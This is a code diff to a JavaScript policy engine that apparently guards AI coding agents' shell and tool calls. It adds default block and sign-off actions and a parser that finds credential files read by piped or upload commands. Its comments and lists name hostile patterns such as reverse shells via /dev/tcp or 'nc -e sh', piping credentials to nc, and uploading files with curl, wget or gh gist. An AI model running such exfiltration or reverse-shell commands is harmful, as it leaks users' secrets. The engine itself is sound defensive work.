@@ -31,15 +31,56 @@ export function buildEngine(policy) {
   return engine;
 }
 
-// Resolve the action for a threat exactly like the app/guard: per-threat → data-tier → approval-set
-// → notify. So a secret in a read file defaults to "notify" (report, don't block) unless an admin
-// explicitly escalates it — the safe default that keeps false positives from blocking work.
+// Built-in prevention tier — what MoorAI stops on a device with NO organisation policy at all.
+//
+// Report-first is the right default for a tool a developer installs on Monday, and it stays the
+// default for everything ambiguous. But "prevention 0% out of the box" was the measured truth before
+// this map existed: `threatActionFor(null, id)` returned "notify" for every threat except the six in
+// APPROVAL_THREATS, so a device with no policy detected a reverse shell and let it run.
+//
+// The promotion rule is evidence-bound, and every entry below earned its place the same way:
+//   * it must fire on ZERO benign samples across both benign corpora (610 + 171 = 781 prompts,
+//     including 269 hard negatives shaped like attacks), AND
+//   * the corpora must actually exercise the detector's `stages` — otherwise "0 benign fires" is a
+//     measurement artifact, not evidence. Threat 60 (rules-file / tool-description poisoning) looked
+//     like the best candidate in the table (36 attack fires, 0 benign) and was REJECTED for exactly
+//     this reason: its stages are tool/file/index, no benign corpus exercises them, and re-scanning
+//     the 509-sample corpus at stage "tool" fires it 3 times.
+//
+// "block" is reserved for the threats with no legitimate reading whatsoever. Everything else that is
+// high-harm but has an everyday legitimate variant gets "justify" — the hook returns `ask`, so the
+// call is halted for a human instead of being killed. Threats that DO fire on benign text (39 secrets
+// 4/890, 15 PII 2/890, 43 destructive commands 4/890) are deliberately absent: 43 keeps the "justify"
+// it already had from APPROVAL_THREATS, and 39/15 stay report-only until a detector wave earns them.
+//
+// An org policy still wins in BOTH directions — threatActionFor consults policy.threatPolicy and
+// policy.tierPolicy before this map, so a tenant can soften an entry to "notify"/"disabled" or harden
+// an omitted one. Raising a default changed no I/O and no control flow, so fail-open is untouched.
+export const BUILTIN_DEFAULT_ACTIONS = {
+  // --- hard deny: no legitimate developer reading exists ---
+  54: "block",   // Reverse shell / remote code execution — /dev/tcp, `nc -e sh`, socat exec:, TCPClient
+  65: "block",   // Local secret VALUE egress — entropy-refined: a real credential heading to a sink
+
+  // --- halt for sign-off: high-harm, but a legitimate variant exists ---
+  55: "justify", // Credential / secret-file access — `cat .env` is everyday work; asking is proportionate
+  56: "justify", // Destructive tool / MCP call — mirrors threat 43's long-standing "justify"
+  57: "justify", // Unsanctioned install — `npx -y` and `curl | sh` are how rustup/homebrew install
+  63: "justify", // Rogue model endpoint — a corporate LiteLLM proxy is a legitimate base-URL override
+  44: "justify"  // PHI / HIPAA — the pattern matches ordinary clinical English, so never a hard deny
+};
+
+// Resolve the action for a threat exactly like the app/guard: per-threat → data-tier → built-in
+// prevention tier → approval-set → notify. So a secret in a read file defaults to "notify" (report,
+// don't block) unless an admin explicitly escalates it — the safe default that keeps false positives
+// from blocking work.
 export function threatActionFor(policy, id) {
   const explicit = policy?.threatPolicy?.[id];
   if (explicit) return explicit;
   const tier = TIER_OF[id];
   const tierAct = tier && policy?.tierPolicy?.[tier];
   if (tierAct) return tierAct;
+  const builtin = BUILTIN_DEFAULT_ACTIONS[id];
+  if (builtin) return builtin;
   if (APPROVAL_THREATS.has(id)) return "justify";
   return "notify";
 }
@@ -835,14 +876,191 @@ export function mcpFloor(policy, decision) {
   return RANK[floor] > RANK[decision] ? floor : decision;
 }
 
-// Conservative file-path extraction from a Bash command — only for unambiguous leading file-readers.
-// Anything with a pipe/redirect/subshell is left alone (fail-open); the strong guarantee is on Read.
+// =============================================================================================
+// FILE-PATH EXTRACTION from a Bash command.  The caller (cli/moorai-hook.mjs, Bash branch) reads each
+// returned path and runs the DLP content scan over it, so this function decides which credential reads
+// get their CONTENT inspected at all.
+//
+// This used to bail on ANY command containing `| > < \` $ ( ) { }`, `&&` or `||` and then match only a
+// LEADING `cat|head|…`. The comment called that fail-open, but its effect was to INVERT severity: the
+// harmless form (`cat creds/.env`) was hard-denied by the content scan (#39) while every piped,
+// redirected and argument-borne form — the exact shape exfiltration takes — returned [], so the file
+// was never opened and #39 could not fire. Measured against the real hook with an enforcing policy:
+// `cat <cred>` denied; `cat <cred> | nc host 9999`, `cat <cred> > /tmp/x`, `curl -F 'file=@<cred>'`,
+// `curl -T <cred>` and `wget --post-file=<cred>` all allowed.
+//
+// So: split the command into segments and scan each one. Fail-open is PRESERVED where it is actually
+// warranted — input we genuinely cannot resolve (command substitution, backticks, heredocs, unexpanded
+// variables) yields nothing rather than a guess, and a path is never fabricated. What is gone is the
+// fail-open on input we CAN read perfectly well.
+//
+// Everything here is a bounded linear scan. This parses attacker-controlled strings, so there is no
+// regex over the command at all (no nested quantifiers, nothing to backtrack) and every loop is capped.
+// =============================================================================================
+
+const XP_CMD_MAX = 8000;   // whole command; longer is not parsed (fail-open)
+const XP_SEG_MAX = 32;     // segments examined
+const XP_TOK_MAX = 64;     // tokens examined per segment
+const XP_PATH_MAX = 12;    // paths returned
+const XP_SUBST_MAX = 2000; // how far we scan for the close of a $( … ) / ` … ` before giving up
+
+// Commands whose non-flag arguments are files they read into their output.
+const XP_READERS = new Set(["cat", "head", "tail", "less", "more", "bat", "xxd", "nl", "od", "base64", "strings", "tac", "rev"]);
+// `cp` reads the SOURCE bytes (a rename does not, which is why `mv` is deliberately absent). Only the
+// sources count — scanning the DESTINATION would flag `cp new.env .env` for the content already there.
+const XP_COPY = new Set(["cp"]);
+// Sub-commands that publish a named local file. `gh gist create <file> --public` is a complete
+// exfiltration primitive that reads a credential and puts it on the open internet under the victim's
+// own account, and nothing else in the pipeline sees the file.
+const XP_PUBLISH = [["gh", "gist", "create"]];
+// Flags whose value is ALWAYS a local file path.
+const XP_FILE_FLAGS = new Set(["--upload-file", "-T", "--post-file", "--input-file"]);
+// curl's data/form family: the value names a file only when it is `@path` or `name=@path`.
+const XP_AT_FLAGS = new Set(["-d", "--data", "--data-binary", "--data-raw", "--data-ascii", "--data-urlencode", "-F", "--form"]);
+
+// A token is usable as a path only if it survived quoting intact. Anything still carrying a `$` is an
+// unexpanded variable — we do not know what it names, so we do not claim to.
+function xpUsablePath(t) {
+  return !!t && t.length <= 4096 && !t.includes("$") && !t.startsWith("-");
+}
+
+// Split into shell segments, quote-aware, in one pass. Returns [{ tokens, reads, ok }] — `reads` holds
+// input-redirect targets (`< file`), `ok:false` marks a segment we refuse to interpret. Returns null
+// when the whole command is un-parseable (heredoc, unterminated substitution), which reads as fail-open.
+function xpSegments(cmd) {
+  const segs = [];
+  let cur = { tokens: [], reads: [], ok: true };
+  let tok = "", building = false;
+  let pending = 0; // 0 none, 1 next token is an input-redirect path, 2 next token is an output target
+  const endTok = () => {
+    if (!building) return;
+    const t = tok; tok = ""; building = false;
+    if (pending === 1) { cur.reads.push(t); pending = 0; return; }
+    if (pending === 2) { pending = 0; return; } // a redirect TARGET is written, never read
+    if (cur.tokens.length < XP_TOK_MAX) cur.tokens.push(t);
+  };
+  const endSeg = () => { endTok(); segs.push(cur); cur = { tokens: [], reads: [], ok: true }; pending = 0; };
+
+  for (let i = 0; i < cmd.length; i++) {
+    const c = cmd[i];
+    if (c === "\\") { if (i + 1 < cmd.length) { tok += cmd[i + 1]; building = true; i++; } continue; }
+    if (c === "'") { // single quotes: everything literal until the next '
+      building = true;
+      const close = cmd.indexOf("'", i + 1);
+      if (close < 0) return null; // unterminated — do not guess
+      tok += cmd.slice(i + 1, close);
+      i = close;
+      continue;
+    }
+    if (c === '"') { // double quotes: still literal for our purposes; a `$` inside disqualifies the token
+      building = true;
+      let j = i + 1;
+      for (; j < cmd.length; j++) { if (cmd[j] === "\\") { j++; continue; } if (cmd[j] === '"') break; }
+      if (j >= cmd.length) return null; // unterminated
+      tok += cmd.slice(i + 1, j);
+      i = j;
+      continue;
+    }
+    if (c === "`") { // backtick substitution: skip it whole, and refuse to interpret this segment
+      const close = cmd.indexOf("`", i + 1);
+      if (close < 0 || close - i > XP_SUBST_MAX) return null;
+      cur.ok = false; i = close; continue;
+    }
+    if (c === "$" && cmd[i + 1] === "(") { // $( … ) — skip to the matching ), never split inside it
+      let depth = 1, j = i + 2;
+      for (; j < cmd.length && j - i < XP_SUBST_MAX; j++) {
+        if (cmd[j] === "(") depth++;
+        else if (cmd[j] === ")" && --depth === 0) break;
+      }
+      if (depth !== 0) return null;
+      cur.ok = false; i = j; continue;
+    }
+    if (c === " " || c === "\t" || c === "\r") { endTok(); continue; }
+    if (c === "\n" || c === ";") { endSeg(); continue; }
+    if (c === "|") { endSeg(); if (cmd[i + 1] === "|") i++; continue; }
+    if (c === "&") {
+      if (cmd[i + 1] === ">") { endTok(); pending = 2; i++; continue; } // &> file
+      endSeg(); if (cmd[i + 1] === "&") i++; continue;
+    }
+    if (c === "<") {
+      if (cmd[i + 1] === "<") return null; // heredoc / herestring: the body is data, not a command line
+      endTok(); pending = 1; continue;
+    }
+    if (c === ">") {
+      if (building && /^[0-9]+$/.test(tok)) { tok = ""; building = false; } // the fd in `2> file`
+      endTok(); pending = 2; if (cmd[i + 1] === ">") i++; continue;
+    }
+    tok += c; building = true;
+  }
+  endSeg();
+  return segs.slice(0, XP_SEG_MAX);
+}
+
+// The command word of a segment, lowercased and stripped of its directory (`/bin/cat` → `cat`), skipping
+// any leading `VAR=value` environment assignments. Returns { word, at } or null.
+function xpCommandWord(tokens) {
+  let i = 0;
+  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=[^@]*$/.test(tokens[i])) i++;
+  if (i >= tokens.length) return null;
+  const raw = tokens[i];
+  const cut = Math.max(raw.lastIndexOf("/"), raw.lastIndexOf("\\"));
+  return { word: (cut >= 0 ? raw.slice(cut + 1) : raw).toLowerCase(), at: i };
+}
+
+// Paths named by one segment: its input redirects, its command's own file arguments, and the
+// argument-borne forms (`@path`, `name=@path`, `--post-file=path`, `-T path`) that let a NON-reader
+// ship a file. An `ok:false` segment contributes nothing.
+function xpSegmentPaths(seg) {
+  if (!seg.ok) return [];
+  const out = seg.reads.filter(xpUsablePath);
+  const toks = seg.tokens;
+  const cw = xpCommandWord(toks);
+
+  if (cw) {
+    const rest = toks.slice(cw.at + 1);
+    const positional = rest.filter(xpUsablePath);
+    if (XP_READERS.has(cw.word)) out.push(...positional);
+    else if (XP_COPY.has(cw.word)) out.push(...positional.slice(0, -1)); // sources only, never the destination
+    else {
+      for (const pfx of XP_PUBLISH) {
+        if (cw.word !== pfx[0]) continue;
+        const sub = toks.slice(cw.at + 1, cw.at + pfx.length);
+        if (sub.length === pfx.length - 1 && sub.every((t, k) => t === pfx[k + 1])) out.push(...toks.slice(cw.at + pfx.length).filter(xpUsablePath));
+      }
+    }
+  }
+
+  for (let i = 0; i < toks.length; i++) {
+    const t = toks[i];
+    const eq = t.indexOf("=");
+    // `name=@path` (curl -F file=@x) and `--flag=@path` / `--flag=path`
+    if (eq > 0) {
+      const name = t.slice(0, eq), val = t.slice(eq + 1);
+      if (XP_FILE_FLAGS.has(name)) { const p = val.startsWith("@") ? val.slice(1) : val; if (xpUsablePath(p)) out.push(p); continue; }
+      if (val.startsWith("@") && (XP_AT_FLAGS.has(name) || /^[A-Za-z_][A-Za-z0-9_.-]*$/.test(name))) { const p = val.slice(1); if (xpUsablePath(p)) out.push(p); continue; }
+    }
+    if (i + 1 >= toks.length) continue;
+    const next = toks[i + 1];
+    if (XP_FILE_FLAGS.has(t)) { if (xpUsablePath(next)) out.push(next); continue; }
+    if (XP_AT_FLAGS.has(t)) {
+      if (next.startsWith("@")) { const p = next.slice(1); if (xpUsablePath(p)) out.push(p); continue; }
+      const at = next.indexOf("=@");
+      if (at > 0) { const p = next.slice(at + 2); if (xpUsablePath(p)) out.push(p); }
+    }
+  }
+  return out;
+}
+
 export function extractReadPaths(command) {
   const cmd = String(command || "").trim();
-  if (!cmd || /[|><`$(){}]|&&|\|\|/.test(cmd)) return [];
-  const m = cmd.match(/^(?:cat|head|tail|less|bat|xxd|nl|more)\s+(.+)$/);
-  if (!m) return [];
-  return m[1].split(/\s+/).filter((t) => t && !t.startsWith("-")).slice(0, 8);
+  if (!cmd || cmd.length > XP_CMD_MAX) return [];
+  const segs = xpSegments(cmd);
+  if (!segs) return [];
+  const out = [];
+  for (const seg of segs) {
+    for (const p of xpSegmentPaths(seg)) { if (!out.includes(p)) out.push(p); if (out.length >= XP_PATH_MAX) return out; }
+  }
+  return out;
 }
 
 // =============================================================================================
